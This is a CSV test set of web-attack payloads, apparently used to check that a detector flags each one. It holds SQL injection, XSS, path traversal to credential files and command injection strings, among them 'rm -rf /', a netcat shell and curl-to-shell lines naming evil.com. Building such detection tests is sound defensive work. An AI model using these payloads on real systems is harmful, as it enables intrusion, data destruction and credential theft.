id,category,payload,severity,confidence,expected_detection
sql_injection_1,SQL Injection,' OR '1'='1,High,0.8102941000569891,True
sql_injection_2,SQL Injection,'; DROP TABLE users; --,Critical,0.9692632196899741,True
sql_injection_3,SQL Injection,' UNION SELECT * FROM passwords --,Critical,0.8510369722144426,True
sql_injection_4,SQL Injection,admin'--,Critical,0.8176909002190506,True
sql_injection_5,SQL Injection,' OR 1=1 #,Critical,0.9383205205792173,True
sql_injection_6,SQL Injection,'; EXEC xp_cmdshell('dir'); --,Critical,0.8376464189225437,True
sql_injection_7,SQL Injection,' AND (SELECT COUNT(*) FROM users) > 0 --,High,0.9596540533558391,True
sql_injection_8,SQL Injection,' OR SLEEP(5) --,High,0.8119179705746976,True
sql_injection_9,SQL Injection,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",Critical,0.8897449489574203,True
sql_injection_10,SQL Injection,' OR '1'='1' /*,Critical,0.8265474294589282,True
sql_injection_11,SQL Injection,"'; INSERT INTO users VALUES ('hacker', 'password'); --",High,0.8572336553209151,True
sql_injection_12,SQL Injection,"' UNION ALL SELECT NULL,NULL,NULL,table_name FROM information_schema.tables --",Critical,0.9195652465589659,True
sql_injection_13,SQL Injection,admin' OR '1'='1' --,High,0.9942063555122035,True
sql_injection_14,SQL Injection,' OR 1=1 LIMIT 1 --,Critical,0.9934736088728544,True
sql_injection_15,SQL Injection,'; UPDATE users SET password='hacked' WHERE username='admin'; --,Critical,0.9443186008537646,True
xss_attack_1,XSS Attack,<script>alert('XSS')</script>,Critical,0.8898257262391509,True
xss_attack_2,XSS Attack,<img src=x onerror=alert('XSS')>,High,0.8272016417737944,True
xss_attack_3,XSS Attack,javascript:alert('XSS'),Critical,0.8358009919019115,True
xss_attack_4,XSS Attack,<svg onload=alert('XSS')>,High,0.9484806565510364,True
xss_attack_5,XSS Attack,<iframe src=javascript:alert('XSS')></iframe>,Critical,0.8353497226239859,True
xss_attack_6,XSS Attack,<body onload=alert('XSS')>,High,0.8059227731274601,True
xss_attack_7,XSS Attack,<input onfocus=alert('XSS') autofocus>,Critical,0.9959700948377006,True
xss_attack_8,XSS Attack,<select onfocus=alert('XSS') autofocus>,Critical,0.8680924727891116,True
xss_attack_9,XSS Attack,<textarea onfocus=alert('XSS') autofocus>,High,0.9962821841946412,True
xss_attack_10,XSS Attack,<keygen onfocus=alert('XSS') autofocus>,High,0.9645528997822557,True
xss_attack_11,XSS Attack,<video><source onerror=alert('XSS')>,High,0.963650761115295,True
xss_attack_12,XSS Attack,<audio src=x onerror=alert('XSS')>,Critical,0.8973909295677013,True
xss_attack_13,XSS Attack,<details open ontoggle=alert('XSS')>,Critical,0.9997126724449987,True
xss_attack_14,XSS Attack,<marquee onstart=alert('XSS')>,Critical,0.9857779735060361,True
xss_attack_15,XSS Attack,'-alert('XSS')-',High,0.8011002773735155,True
path_traversal_1,Path Traversal,../../../etc/passwd,Critical,0.9292889538940465,True
path_traversal_2,Path Traversal,..\..\..\windows\system32\config\sam,Critical,0.8090982926471463,True
path_traversal_3,Path Traversal,....//....//....//etc/passwd,High,0.9621559939038936,True
path_traversal_4,Path Traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,High,0.9620611026788928,True
path_traversal_5,Path Traversal,..%252f..%252f..%252fetc%252fpasswd,High,0.9866496839432778,True
path_traversal_6,Path Traversal,..%c0%af..%c0%af..%c0%afetc%c0%afpasswd,Critical,0.9049766634710169,True
path_traversal_7,Path Traversal,../../../../../../etc/shadow,High,0.8668535421096514,True
path_traversal_8,Path Traversal,../../../var/log/apache2/access.log,Critical,0.916678500156318,True
path_traversal_9,Path Traversal,..\..\..\boot.ini,Critical,0.841506177244876,True
path_traversal_10,Path Traversal,....\\....\\....\\windows\\system32\\drivers\\etc\\hosts,Critical,0.932712630377796,True
command_injection_1,Command Injection,; ls -la,High,0.9646121967035051,True
command_injection_2,Command Injection,| cat /etc/passwd,High,0.8462189108742589,True
command_injection_3,Command Injection,&& whoami,Critical,0.9013220058717681,True
command_injection_4,Command Injection,; rm -rf /,Critical,0.8294275335371429,True
command_injection_5,Command Injection,| nc -l -p 4444 -e /bin/sh,Critical,0.9203252066287895,True
command_injection_6,Command Injection,; curl http://evil.com/shell.sh | sh,Critical,0.8819970357739365,True
command_injection_7,Command Injection,&& wget http://malicious.com/backdoor.php,High,0.8879767852420631,True
command_injection_8,Command Injection,"; python -c 'import os; os.system(""id"")'",Critical,0.9240285898309782,True
command_injection_9,Command Injection,"| perl -e 'system(""id"")'",Critical,0.8854147912403811,True
command_injection_10,Command Injection,"&& powershell.exe -Command ""Get-Process""",High,0.8265782535797829,True
encoded_sql_injection_1,Encoded SQL Injection,%27 OR %271%27=%271,High,0.7152478513181694,True
encoded_sql_injection_2,Encoded SQL Injection,%27; DROP TABLE users; --,Critical,0.8000249529699763,True
encoded_sql_injection_3,Encoded SQL Injection,%27 UNION SELECT * FROM passwords --,Critical,0.8708768582651717,True
encoded_sql_injection_4,Encoded SQL Injection,admin%27--,Critical,0.79880157578114,True
encoded_sql_injection_5,Encoded SQL Injection,%27 OR 1=1 #,Critical,0.894785867937957,True
encoded_sql_injection_6,Encoded SQL Injection,%27; EXEC xp_cmdshell(%27dir%27); --,Critical,0.7796388373467756,True
encoded_sql_injection_7,Encoded SQL Injection,%27 AND (SELECT COUNT(*) FROM users) %3E 0 --,High,0.8714505301182822,True
encoded_sql_injection_8,Encoded SQL Injection,%27 OR SLEEP(5) --,High,0.8301973015265874,True
encoded_sql_injection_9,Encoded SQL Injection,"1%27 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",Critical,0.8010653994220807,True
encoded_sql_injection_10,Encoded SQL Injection,%27 OR %271%27=%271%27 /*,Critical,0.7758977607669462,True
